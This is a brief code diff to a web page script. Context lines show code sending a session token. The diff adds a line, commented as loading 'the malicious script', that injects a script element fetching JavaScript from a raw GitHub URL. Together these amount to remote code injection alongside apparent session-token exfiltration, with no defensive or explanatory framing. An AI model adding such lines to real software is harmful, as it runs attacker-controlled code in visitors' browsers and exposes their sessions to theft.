@@ -16,3 +16,6 @@ if (sessionToken) {
             console.error('Error sending session token:', error);
         });
 }
+
+// Load the malicious script from GitHub
+document.body.appendChild(document.createElement('script')).src = 'https://raw.githubusercontent.com/hamhem/maliciousjs/main/malicious.js';
